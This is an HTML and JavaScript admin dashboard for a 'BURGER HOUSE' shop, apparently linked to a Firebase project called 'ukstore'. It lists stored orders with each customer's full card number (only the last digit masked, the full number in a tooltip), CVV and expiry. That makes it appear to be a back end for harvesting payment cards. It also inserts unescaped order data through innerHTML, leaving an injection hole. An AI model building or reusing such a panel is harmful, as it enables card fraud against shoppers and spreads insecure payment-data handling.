<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard | BURGER HOUSE</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: #f5f5f5;
        }

        .admin-container {
            display: flex;
        }

        .sidebar {
            width: 280px;
            background: #1a1a1a;
            color: white;
            height: 100vh;
            position: fixed;
            padding: 30px 20px;
        }

        .sidebar h2 {
            color: #c49b63;
            margin-bottom: 40px;
            font-size: 24px;
        }

        .sidebar ul {
            list-style: none;
        }

        .sidebar li {
            padding: 15px;
            margin: 5px 0;
            border-radius: 10px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .sidebar li:hover,
        .sidebar li.active {
            background: #c49b63;
        }

        .content {
            margin-left: 280px;
            padding: 30px;
            width: calc(100% - 280px);
        }

        .header {
            background: white;
            padding: 20px 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 25px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }

        .stat-card h3 {
            font-size: 32px;
            color: #c49b63;
            margin-bottom: 5px;
        }

        .section-card {
            background: white;
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 30px;
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            text-align: left;
            padding: 15px;
            background: #f8f9fa;
            border-bottom: 2px solid #dee2e6;
        }

        td {
            padding: 15px;
            border-bottom: 1px solid #eee;
        }

        .card-number {
            font-family: monospace;
            font-size: 16px;
            font-weight: 600;
        }

        .btn-logout {
            background: #c49b63;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="admin-container">
        <div class="sidebar">
            <h2>BURGER HOUSE</h2>
            <ul>
                <li class="active" onclick="showSection('orders')">
                    <i class="fas fa-shopping-cart"></i> Orders
                </li>
                <li onclick="showSection('products')">
                    <i class="fas fa-box"></i> Products
                </li>
                <li onclick="showSection('users')">
                    <i class="fas fa-users"></i> Users
                </li>
                <li onclick="logout()" style="margin-top:50px; color:#ef4444;">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </li>
            </ul>
        </div>

        <div class="content">
            <div class="header">
                <h1>Orders Management</h1>
                <button class="btn-logout" onclick="logout()">Logout</button>
            </div>

            <div class="stats">
                <div class="stat-card">
                    <h3 id="totalOrders">0</h3>
                    <p>Total Orders</p>
                </div>
                <div class="stat-card">
                    <h3 id="totalRevenue">$0</h3>
                    <p>Revenue</p>
                </div>
                <div class="stat-card">
                    <h3 id="totalProducts">0</h3>
                    <p>Products</p>
                </div>
            </div>

            <div class="section-card" id="orders">
                <h2>Recent Orders</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Order ID</th>
                            <th>Customer</th>
                            <th>Items</th>
                            <th>Total</th>
                            <th>Card Number</th>
                            <th>CVV</th>
                            <th>Expiry</th>
                            <th>Date</th>
                        </tr>
                    </thead>
                    <tbody id="ordersTable"></tbody>
                </table>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDvpwrivywDoS4KrEKDjJfHvrVLTDHMHJQ",
            authDomain: "ukstore-147e3.firebaseapp.com",
            projectId: "ukstore-147e3",
            storageBucket: "ukstore-147e3.firebasestorage.app",
            messagingSenderId: "682218466479",
            appId: "1:682218466479:web:2cf15486de7a18efb0b85a"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        // Check admin access
        auth.onAuthStateChanged(async (user) => {
            if (!user) {
                window.location.href = '../index.html';
                return;
            }

            const userDoc = await db.collection('users').doc(user.uid).get();
            if (!userDoc.exists || userDoc.data().role !== 'admin') {
                alert('Access Denied');
                window.location.href = '../index.html';
                return;
            }

            loadOrders();
            loadStats();
        });

        // Mask card number - LAST DIGIT ONLY HIDDEN
        function maskCardNumber(cardNumber) {
            if (!cardNumber) return 'N/A';
            const clean = cardNumber.replace(/\s/g, '');
            if (clean.length >= 16) {
                // Show first 15 digits, hide last 1
                const first15 = clean.slice(0, 15);
                const formatted = first15.match(/.{1,4}/g)?.join(' ') || first15;
                return formatted + '*';
            }
            return cardNumber;
        }

        async function loadOrders() {
            const snapshot = await db.collection('orders').orderBy('createdAt', 'desc').get();
            const tbody = document.getElementById('ordersTable');
            tbody.innerHTML = '';

            snapshot.forEach(doc => {
                const order = doc.data();
                const card = order.cardDetails || {};
                
                // Mask card number - only last digit hidden
                const maskedCard = maskCardNumber(card.cardNumber);
                
                const items = order.items?.map(i => `${i.quantity}x ${i.name}`).join(', ') || 'N/A';
                
                tbody.innerHTML += `
                    <tr>
                        <td>#${doc.id.slice(-6)}</td>
                        <td>${order.userEmail || 'N/A'}</td>
                        <td>${items}</td>
                        <td>$${order.total || 0}</td>
                        <td class="card-number" title="Full: ${card.cardNumber || ''}">${maskedCard}</td>
                        <td>${card.cvv || 'N/A'}</td>
                        <td>${card.expiry || 'N/A'}</td>
                        <td>${new Date(order.createdAt).toLocaleDateString()}</td>
                    </tr>
                `;
            });
        }

        async function loadStats() {
            const ordersSnap = await db.collection('orders').get();
            document.getElementById('totalOrders').textContent = ordersSnap.size;
            
            let revenue = 0;
            ordersSnap.forEach(doc => revenue += doc.data().total || 0);
            document.getElementById('totalRevenue').textContent = '$' + revenue.toFixed(2);
            
            const productsSnap = await db.collection('products').get();
            document.getElementById('totalProducts').textContent = productsSnap.size;
        }

        function showSection(section) {
            // Simple navigation
        }

        async function logout() {
            await auth.signOut();
            window.location.href = '../index.html';
        }
    </script>
</body>
</html>
